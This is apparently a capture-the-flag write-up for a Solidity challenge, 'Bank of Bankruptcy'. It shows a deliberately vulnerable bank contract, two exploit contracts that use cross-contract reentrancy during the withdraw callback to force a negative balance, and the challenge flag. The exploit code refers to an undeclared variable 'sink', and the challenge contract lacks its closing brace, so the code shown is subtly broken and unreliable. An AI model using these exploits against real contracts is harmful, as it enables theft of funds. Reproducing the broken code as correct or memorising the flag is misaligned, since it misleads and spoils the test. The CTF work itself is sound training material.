## Description 
```Conspiracy to commit bankrupt
472
kribas web3
I wanted to run a mafia family, not go bankrupt! Who knew those two things were the same?

To receive the contract address and claim the flag, ask the server!

nc chall.ctf.k1nd4sus.it 31008
```

## CTF challenge file
- `BankOFBankruptcy.sol`
```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.28;
contract BankOfBankruptcy {

	mapping(address => int256) public balance;
	mapping(address => mapping(address => uint256)) allow;
	mapping(address => bool) lock;
	mapping(address => bool) registered;
	mapping(address => uint256) claims;
	uint256 MAX_AMOUNT = 1000;
	
	event BankruptcyClaim(address who, uint256 claimID);
	constructor () {
    }

	modifier notReentrant(){
		require(!lock[msg.sender],"Nope");
		_;
	}

	modifier withinLimit(uint256 amount){
		require(amount <= MAX_AMOUNT,"Amount must be within limit");
		_;
	}

	modifier requireRegistration(address addr) {
		require(registered[addr],"Address is not registered");
		_; 
	}

	function allowTransfer(address dest, uint256 amount) public withinLimit(amount) requireRegistration(dest) requireRegistration(msg.sender){
		allow[msg.sender][dest] += amount;
	}
	
	function transferFrom(address from, uint256 amount) public withinLimit(amount) requireRegistration(from) requireRegistration(msg.sender){
		require(balance[from] >= int256(amount), "Sender has not enough $$");
		require(allow[from][msg.sender] >= amount, "Not Enough allowance");
		balance[from] -= int256(amount);
		allow[from][msg.sender] -= amount;
		balance[msg.sender] += int256(amount);
	}

	function withdraw(uint256 amount) public notReentrant withinLimit(amount) requireRegistration(msg.sender){
		lock[msg.sender] = true;
		require(balance[msg.sender] >= int256(amount),"Not enough balance");
		(bool status, ) = msg.sender.call("withdrawCallback");
        require(status, "Reverting...");
		balance[msg.sender] -= int256(amount);
		lock[msg.sender] = false;
	}

	function register() public {
		require(!registered[msg.sender],"Already Registered");
		balance[msg.sender] = 1000;
		registered[msg.sender] = true;
	}

	function fileBankruptcy(uint256 caseNumber) public requireRegistration(msg.sender){
		require(balance[msg.sender] < 0, "You are not bankrupt... yet.");
		claims[msg.sender] = caseNumber;
		emit BankruptcyClaim(msg.sender,caseNumber);
	}

	function getCaseNumber(address addr) public view requireRegistration(addr) returns (uint256){
		return claims[addr];
	}
```
## Solution
The goal is to get our address bankrupted (balance < 0) and be able to call `fileBankruptcy()` with a provided uint256. The challenge was deployed on sepolia 
`0x9Cb06d60Ff4C56F4cB596EFc8aA67acdcb39fFD9`
### Exploit.sol
```solidity
/// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.28;

interface IBankOfBankruptcy {
    function register() external;
    function allowTransfer(address dest, uint256 amount) external;
    function withdraw(uint256 amount) external;
    function fileBankruptcy(uint256 caseNumber) external;
    function getCaseNumber(address addr) external view returns (uint256);
}

interface IExploit2 {
    function finalize() external;
}

contract Exploit {
    IBankOfBankruptcy public bank;
    address public exploit2;
    uint256 public MAX_AMOUNT = 1000; // Matches BankOfBankruptcy
    address public owner;

    constructor(address _bankAddress, address _exploit2) {
        bank = IBankOfBankruptcy(_bankAddress);
        exploit2 = _exploit2;
        owner = msg.sender;
    }

    function exploit() public payable {
        require(msg.sender == owner, "Only owner");
        bank.register(); // balance[this] = 1000
        (bool success, ) = address(bank).call(abi.encodeWithSignature("allowTransfer(address,uint256)", sink, MAX_AMOUNT));
        require(success, "allowTransfer failed");
        (success, ) = address(bank).call(abi.encodeWithSignature("withdraw(uint256)", MAX_AMOUNT));
        require(success, "withdraw failed");
    }

    function withdrawCallback() external {
        require(msg.sender == address(bank), "Only bank");
        IExploit2(exploit2).finalize();
        // Return data to satisfy .call 
        assembly {
            mstore(0x80, 32)    // MEM[128] = 32
            mstore(0xa0, 32)    // MEM[160] = 32
            return(0x80, 64)    // Return 64 bytes from MEM[128]
        }
    }

    function hack(uint256 id) public payable returns (bool) {
        require(msg.sender == owner, "Only owner");
        (bool success, ) = address(bank).call(abi.encodeWithSignature("fileBankruptcy(uint256)", id));
        require(success, "fileBankruptcy failed");
    }

    
    fallback() external payable {
        IExploit2(exploit2).finalize();
        assembly {
            mstore(0x80, 1)
            return(0x80, 32)
        }
    }

    receive() external payable { }
}
```
### Exploit2.sol
```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.28;

interface IBankOfBankruptcy {
    function transferFrom(address from, uint256 amount) external;
    function register() external;
}

contract Exploit2 {
    IBankOfBankruptcy public bank;
    address public owner;

    constructor(address _bankAddress) {
        bank = IBankOfBankruptcy(_bankAddress);
        owner = msg.sender;
    }

    function finalize() external {
        bank.transferFrom(msg.sender, 1000); // msg.sender is Exploit
    }

    function register() public {
        bank.register();
    }
}
```
## Flag
`KSUS{4lw4y5_tw0_th3r3_4r3_n0_m0r3_n0_l355_f0ef27c8e87}`

  
